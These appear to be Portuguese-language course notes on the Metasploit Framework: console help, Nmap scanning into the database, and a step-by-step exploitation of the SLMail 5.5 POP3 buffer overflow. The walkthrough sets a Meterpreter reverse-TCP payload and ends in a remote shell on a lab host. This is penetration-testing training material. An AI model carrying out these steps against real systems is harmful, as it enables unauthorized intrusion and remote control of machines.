# 14 - Metasploit Framework

## 01 - Metasploit Framework Introdução

##### [https://www.rapid7.com/products/metasploit/](https://www.rapid7.com/products/metasploit/)

### Database

##### [https://www.rapid7.com/db](https://www.rapid7.com/db)

The Rapid7 Vulnerability and Exploit Database is a curated repository of vetted computer software exploits and exploitable vulnerabilities.  Technical details for over 70,000 vulnerabilities and 3,000 exploits are available for security professionals and researchers to review. These vulnerabilities are utilized by our vulnerability management tool Nexpose. The exploits are all included in the Metasploit framework and utilized by our penetration testing tool, Metasploit Pro. Our vulnerability and exploit database is updated frequently and contains the most recent security research.

### Usage

* Start postgresql service

```
root@kali:~# service postgresql start
```

```
root@kali:~# msfconsole 
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v4.16.43-dev                         ]
+ -- --=[ 1742 exploits - 996 auxiliary - 301 post        ]
+ -- --=[ 526 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > 
```

* Help

```
msf > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    irb           Drop into irb scripting mode
    load          Load a framework plugin
    quit          Exit the console
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    edit          Edit the current module or a file with the preferred editor
    info          Displays information about one or more modules
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Selects a module by name


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database

msf > 
```

* Database status

```
msf > db_status 
[*] postgresql selected, no connection
msf > 
```

* Nmap

```
msf > db_nmap -A 172.16.1.4
[*] Nmap: Starting Nmap 7.00 ...
```

* Exibindo informações de hosts escaneados pelo Nmap

```
msf > hosts
Hosts
=====

address    mac    name    os_name              ...
172.16.1.4                Windows 2000         ...
```

* Exibindo se há alguma vulnerabilidade nos hosts

```
msf> vulns
```

* Escan com informações de versões

```
msf > db_nmap -sV 172.16.1.4
[*] Nmap: Starting Nmap 7.00 ...
```

* Exibindo serviços de host

```
msf > services
Services
========
					...
```

* Efetuando a varredura por fora do Metasploit

```
root@kali:~# nmap -v -A 172.16.1.5 -oX host5.xml
					...
```

* Importando informaçoes de arquivo xml

```
msf > db_import /path/to/file.xml
```

```
msf > hosts
Hosts
=====
					...
msf > services
Services
=====
					...
```

* Search

```
msf > search -h
msf > search slmail
			...
```

* Utilizando exploit

```
msf > use path/to/exploit
msf > use exploit/windows/pop3/seattlelab_pass
```

```
msf exploit(windows/pop3/seattlelab_pass) > info

       Name: Seattle Lab Mail 5.5 POP3 Buffer Overflow
     Module: exploit/windows/pop3/seattlelab_pass
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2003-05-07

Provided by:
  stinko <vinnie@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Windows NT/2000/XP/2003 (SLMail 5.5)

Basic options:
  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  RHOST                   yes       The target address
  RPORT  110              yes       The target port (TCP)

Payload information:
  Space: 600
  Avoid: 4 characters

Description:
  There exists an unauthenticated buffer overflow vulnerability in the 
  POP3 server of Seattle Lab Mail 5.5 when sending a password with 
  excessive length. Successful exploitation should not crash either 
  the service or the server; however, after initial use the port 
  cannot be reused for successive exploitation until the service has 
  been restarted. Consider using a command execution payload following 
  the bind shell to restart the service if you need to reuse the same 
  port. The overflow appears to occur in the debugging/error reporting 
  section of the slmail.exe executable, and there are multiple offsets 
  that will lead to successful exploitation. This exploit uses 2606, 
  the offset that creates the smallest overall payload. The other 
  offset is 4654. The return address is overwritten with a "jmp esp" 
  call from the application library SLMFC.DLL found in 
  %SYSTEM%\system32\. This return address works against all version of 
  Windows and service packs. The last modification date on the library 
  is dated 06/02/99. Assuming that the code where the overflow occurs 
  has not changed in some time, prior version of SLMail may also be 
  vulnerable with this exploit. The author has not been able to 
  acquire older versions of SLMail for testing purposes. Please let us 
  know if you were able to get this exploit working against other 
  SLMail versions.

References:
  https://cvedetails.com/cve/CVE-2003-0264/
  OSVDB (11975)
  http://www.securityfocus.com/bid/7519

msf exploit(windows/pop3/seattlelab_pass) > 
```

* Options

```
msf exploit(windows/pop3/seattlelab_pass) > options

Module options (exploit/windows/pop3/seattlelab_pass):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  110              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Windows NT/2000/XP/2003 (SLMail 5.5)
```

* Setando informações

```
msf exploit(windows/pop3/seattlelab_pass) > set RHOST 172.16.1.4
RHOST => 172.16.1.4


msf exploit(windows/pop3/seattlelab_pass) > show options

Module options (exploit/windows/pop3/seattlelab_pass):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  172.16.1.4       yes       The target address
   RPORT  110              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Windows NT/2000/XP/2003 (SLMail 5.5)
```

* Payload

```
msf exploit(windows/pop3/seattlelab_pass) > show payloads

Compatible Payloads
===================

   Name                                                Disclosure Date  Rank    Description
   ----                                                ---------------  ----    -----------
   generic/custom                                                       normal  Custom Payload
   generic/debug_trap                                                   normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
   generic/tight_loop                                                   normal  Generic x86 Tight Loop
   windows/adduser                                                      normal  Windows Execute net user /ADD
   					...
```

* Setando payload

```
msf exploit(windows/pop3/seattlelab_pass) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

* Configurando payload

	* LHOST: local/public IP
```
msf exploit(windows/pop3/seattlelab_pass) > show options
Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port

msf exploit(windows/pop3/seattlelab_pass) > set LHOST 10.0.0.1
LHOST => 10.0.0.1
msf exploit(windows/pop3/seattlelab_pass) > set LPORT 4444
LPORT => 4444
```

* Execution

```
msf exploit(windows/pop3/seattlelab_pass) > exploit

[*] Started reverse handler on 10.0.0.1:443
[*] Trying Windows NT/2000/XP/2003 (SLMail 5.5) using jmp esp at 5f4a358f
					...
```

* Meterpreter Commands

```
meterpreter > help
			...

meterpreter > shell
Process 1560 created.
Channel 1 created.
Microsoft Windows XP [versão 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Arquivos de programas\SLmail\System > ipconfig

				...

meterpreter > ls
meterpreter > ps
```

* All Payloads

```
msf > show payloads
```

* 

```
```


* 

```
```

* 

```
```

* 

```
```
